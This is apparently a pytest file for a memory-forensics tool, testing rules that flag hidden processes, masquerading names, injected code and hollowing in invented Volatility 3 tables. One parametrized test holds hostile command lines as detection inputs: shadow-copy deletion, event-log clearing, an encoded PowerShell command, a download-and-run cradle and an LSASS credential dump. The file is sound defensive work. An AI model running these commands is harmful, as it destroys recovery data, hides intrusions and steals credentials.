"""What in a memory image deserves a look first (handlers/mem_findings.py, v0.7.92).

Every table here is invented, in the shape Volatility 3 writes it (after
v0.7.90's unescaping). Host, user and process names are made up.
"""
from __future__ import annotations

import csv
import logging
from pathlib import Path

import pytest

from artifact_engine.config import DATA_DIR
from artifact_engine.core.runner import HandlerSkip, ParserContext
from artifact_engine.handlers import mem_findings as F

_PS = ["TreeDepth", "PID", "PPID", "ImageFileName", "Offset(V)", "Threads", "Handles",
       "SessionId", "Wow64", "CreateTime", "ExitTime"]
_T0 = "2026-01-01 10:00:00.000000 UTC"


def _table(unit: Path, name: str, header: list[str], rows: list[list]) -> None:
    d = unit / "CSVs" / "Memory"
    d.mkdir(parents=True, exist_ok=True)
    with open(d / f"{name}.csv", "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        w.writerows(rows)


def _ps(pid, ppid, name, exit_time="N/A"):
    return [0, pid, ppid, name, "0x1", 1, 1, 1, "False", _T0, exit_time]


_HEALTHY = [_ps(4, 0, "System"), _ps(300, 4, "smss.exe"), _ps(400, 300, "wininit.exe"),
            _ps(500, 400, "services.exe"), _ps(510, 400, "lsass.exe"),
            _ps(600, 500, "svchost.exe"), _ps(700, 650, "explorer.exe")]


def _tree(rows):
    return [[0, r[1], r[2], r[3], "0x1", 1, 1, 1, "False", _T0, "N/A", path, path, path]
            for r, path in rows]


def _run(tmp_path: Path, tables: dict) -> tuple[list[dict], list[dict]]:
    unit = tmp_path / "HOST-01_memory"
    for name, (header, rows) in tables.items():
        _table(unit, name, header, rows)
    out = tmp_path / "out"
    ctx = ParserContext(evidence=unit, out=out, tools=unit, assets=DATA_DIR / "assets",
                        machine_name="HOST-01", volume="x",
                        log=logging.getLogger("aeng.test"))
    F.run(ctx)

    def read(n):
        p = out / n
        return list(csv.DictReader(open(p, encoding="utf-8"))) if p.is_file() else []
    return read("mem_alerts.csv"), read("mem_processes.csv")


def _rules(alerts, severity=None):
    return sorted(a["rule"] for a in alerts
                  if a["rule"] != "coverage" and (severity is None or a["severity"] == severity))


def test_a_healthy_process_list_raises_nothing(tmp_path):
    alerts, procs = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_psscan": (_PS, _HEALTHY)})
    assert _rules(alerts) == []
    assert len(procs) == len(_HEALTHY) and not any(p["suspicious"] for p in procs)


def test_no_process_table_is_a_skip(tmp_path):
    with pytest.raises(HandlerSkip):
        _run(tmp_path, {"mem_cmdline": (["TreeDepth", "PID", "Process", "Args"], [])})


def test_a_missing_table_is_said_where_the_alerts_are(tmp_path):
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY)})
    cov = {a["source"] for a in alerts if a["rule"] == "coverage"}
    assert "mem_malfind" in cov and "mem_netscan" in cov


def test_a_process_unlinked_while_its_threads_run_is_hidden(tmp_path):
    carved = [*_HEALTHY, _ps(900, 600, "evil.exe")]
    xview = (["TreeDepth", "Offset(Virtual)", "Name", "PID", "pslist", "psscan",
              "thrdscan", "csrss", "Exit Time"],
             [[0, "0x1", "evil.exe", 900, "False", "True", "True", "False", ""]])
    alerts, procs = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_psscan": (_PS, carved),
                                    "mem_psxview": xview})
    assert _rules(alerts, "high") == ["hidden_process"]
    assert next(p for p in procs if p["pid"] == "900")["suspicious"] == "yes"


def test_a_carved_process_with_no_live_thread_is_only_medium(tmp_path):
    carved = [*_HEALTHY, _ps(900, 600, "gone.exe")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_psscan": (_PS, carved)})
    assert _rules(alerts) == ["carved_process_not_in_list"]
    assert _rules(alerts, "high") == []


def test_carved_bytes_that_are_not_a_name_are_not_a_process(tmp_path):
    carved = [*_HEALTHY, _ps(901, 600, "y\x01y\ufffdy")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_psscan": (_PS, carved)})
    assert _rules(alerts) == []


def test_a_system_process_under_the_wrong_parent(tmp_path):
    rows = [*_HEALTHY, _ps(800, 700, "lsass.exe")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows)})
    assert "unexpected_parent" in _rules(alerts, "high")
    assert "duplicate_system_process" in _rules(alerts, "high")


def test_an_exited_parent_of_the_right_kind_is_not_needed(tmp_path):
    """csrss/wininit outlive the smss instance that started them."""
    rows = [_ps(4, 0, "System"), _ps(410, 333, "csrss.exe"), _ps(400, 333, "wininit.exe")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows)})
    assert _rules(alerts) == []


def test_a_name_one_keystroke_from_a_system_one(tmp_path):
    rows = [*_HEALTHY, _ps(801, 700, "svch0st.exe"), _ps(802, 700, "lsasss.exe")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows)})
    assert _rules(alerts, "high").count("masquerading_name") == 2


def test_system_binaries_are_judged_by_where_they_run(tmp_path):
    rows = [(_ps(600, 500, "svchost.exe"), "C:\\Users\\Public\\svchost.exe"),
            (_ps(601, 500, "svchost.exe"), "C:\\Windows\\System32\\svchost.exe"),
            (_ps(300, 4, "smss.exe"), "\\SystemRoot\\System32\\smss.exe")]
    hdr = [*_PS, "Audit", "Cmd", "Path"]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, [r for r, _ in rows]),
                                "mem_pstree": (hdr, _tree(rows))})
    out = [a for a in alerts if a["rule"] == "system_binary_out_of_place"]
    assert [a["pid"] for a in out] == ["600"]
    assert "runs_from_user_writable_dir" in _rules(alerts, "medium")


def test_volatilitys_dash_is_not_a_path(tmp_path):
    rows = [(_ps(600, 500, "svchost.exe"), "-")]
    hdr = [*_PS, "Audit", "Cmd", "Path"]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, [r for r, _ in rows]),
                                "mem_pstree": (hdr, _tree(rows))})
    assert _rules(alerts) == []


def test_a_document_spawning_a_shell(tmp_path):
    rows = [*_HEALTHY, _ps(820, 700, "WINWORD.EXE"), _ps(821, 820, "powershell.exe")]
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows)})
    assert "document_or_browser_spawned_shell" in _rules(alerts, "high")


@pytest.mark.parametrize(("cmd", "rule"), [
    ("vssadmin.exe delete shadows /all /quiet", "shadow_copy_deletion"),
    ("wevtutil cl Security", "event_log_clearing"),
    ("powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "encoded_powershell"),
    ("powershell IEX (New-Object Net.WebClient).DownloadString('http://x')", "download_cradle"),
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 510 x.dmp full",
     "credential_access"),
])
def test_attack_shaped_command_lines(tmp_path, cmd, rule):
    rows = [*_HEALTHY, _ps(830, 700, "x.exe")]
    cl = (["TreeDepth", "PID", "Process", "Args"], [[0, 830, "x.exe", cmd]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows), "mem_cmdline": cl})
    assert rule in _rules(alerts)


def test_an_ordinary_command_line_raises_nothing(tmp_path):
    cl = (["TreeDepth", "PID", "Process", "Args"],
          [[0, 600, "svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_cmdline": cl})
    assert _rules(alerts) == []


_NET = ["TreeDepth", "Offset", "Proto", "LocalAddr", "LocalPort", "ForeignAddr",
        "ForeignPort", "State", "PID", "Owner", "Created"]


def test_a_shell_talking_to_the_internet_and_not_to_the_lan(tmp_path):
    rows = [*_HEALTHY, _ps(840, 700, "powershell.exe")]
    net = (_NET, [[0, "0x1", "TCPv4", "10.0.0.5", 50000, "45.66.0.11", 443,
                   "ESTABLISHED", 840, "powershell.exe", _T0],
                  [0, "0x2", "TCPv4", "10.0.0.5", 50001, "10.0.0.9", 445,
                   "ESTABLISHED", 840, "powershell.exe", _T0]])
    alerts, procs = _run(tmp_path, {"mem_pslist": (_PS, rows), "mem_netscan": net})
    hits = [a for a in alerts if a["rule"] == "shell_talking_to_internet"]
    assert len(hits) == 1 and "45.66.0.11" in hits[0]["detail"]
    assert "10.0.0.9" in next(p for p in procs if p["pid"] == "840")["connections"]


_MAL = ["TreeDepth", "PID", "Process", "Start VPN", "End VPN", "Tag", "Protection",
        "CommitCharge", "PrivateMemory", "File output", "Notes", "Hexdump", "Disasm"]


def test_an_unbacked_region_holding_a_pe_header_is_high_and_bare_rwx_is_context(tmp_path):
    mal = (_MAL, [[0, 600, "svchost.exe", "0x1000", "0x2000", "VadS",
                   "PAGE_EXECUTE_READWRITE", 1, 1, "", "", "4d 5a 90 00", ""],
                  [0, 600, "svchost.exe", "0x3000", "0x4000", "VadS",
                   "PAGE_EXECUTE_READWRITE", 1, 1, "", "", "48 89 5c 24", ""]])
    alerts, procs = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_malfind": mal})
    assert _rules(alerts, "high") == ["injected_pe"]
    assert _rules(alerts, "low") == ["injected_code"]
    assert next(p for p in procs if p["pid"] == "600")["injected_regions"] == "2"


_PEB = ["TreeDepth", "PID", "EPROCESS_ImageFileName", "EPROCESS_SeAudit_ImageFileName",
        "PEB_ImageFilePath", "PEB_ImageFilePath_Spoofed", "PEB_CommandLine_Spoofed"]


def test_one_file_written_two_ways_is_not_a_masquerade(tmp_path):
    peb = (_PEB, [
        [0, 300, "smss.exe", "\\Device\\HarddiskVolume2\\Windows\\System32\\smss.exe",
         "\\SystemRoot\\System32\\smss.exe", "True", "False"],
        [0, 600, "svchost.exe", "\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe",
         "C:\\Windows\\system32\\svchost.exe", "True", "False"]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_pebmasquerade": peb})
    assert _rules(alerts) == []


def test_a_peb_naming_another_file_is_a_masquerade(tmp_path):
    peb = (_PEB, [[0, 600, "svchost.exe",
                   "\\Device\\HarddiskVolume2\\Users\\Public\\payload.exe",
                   "C:\\Windows\\system32\\svchost.exe", "True", "False"]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_pebmasquerade": peb})
    assert _rules(alerts, "high") == ["peb_masquerade"]


def test_the_protected_process_shape_of_hollowing_is_only_medium(tmp_path):
    hol = (["TreeDepth", "PID", "Process", "Notes"],
           [[0, 600, "svchost.exe", "There is no VAD starting at the base address of the "
                                    "process executable (0x7ff6)"],
            [0, 510, "lsass.exe", "Image base mismatch between the PEB and the VAD"]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY), "mem_hollowprocesses": hol})
    sev = {a["pid"]: a["severity"] for a in alerts if a["rule"] == "hollowed_process"}
    assert sev == {"600": "medium", "510": "high"}


_YARA = ["pid", "process", "rule", "hits", "samples", "description", "score",
         "reference", "in_security_product"]


def test_yara_in_memory_is_ranked_by_where_and_how_sure(tmp_path):
    yara_rows = [[600, "svchost.exe", "Beacon_Strong", 3, "", "", 90, "", ""],
                 [600, "svchost.exe", "Generic_Loose", 1, "", "", 40, "", ""],
                 [700, "explorer.exe", "No_Score", 2, "", "", "", "", ""],
                 [510, "MsMpEng.exe", "Beacon_Strong", 50, "", "", 90, "", "yes"]]
    alerts, procs = _run(tmp_path, {"mem_pslist": (_PS, _HEALTHY),
                                    "mem_yara": (_YARA, yara_rows)})
    sev = {(a["pid"], a["detail"].split(":")[0]): a["severity"]
           for a in alerts if a["rule"] == "yara_match"}
    assert sev == {("600", "Beacon_Strong"): "high", ("600", "Generic_Loose"): "medium",
                   ("700", "No_Score"): "medium", ("510", "Beacon_Strong"): "low"}
    assert next(p for p in procs if p["pid"] == "600")["suspicious"] == "yes"


def test_the_alerts_are_ranked_most_severe_first(tmp_path):
    rows = [*_HEALTHY, _ps(801, 700, "svch0st.exe")]
    mal = (_MAL, [[0, 600, "svchost.exe", "0x1", "0x2", "VadS", "PAGE_EXECUTE_READWRITE",
                   1, 1, "", "", "00", ""]])
    alerts, _ = _run(tmp_path, {"mem_pslist": (_PS, rows), "mem_malfind": mal})
    ranks = [{"high": 3, "medium": 2, "low": 1}[a["severity"]] for a in alerts]
    assert ranks == sorted(ranks, reverse=True)
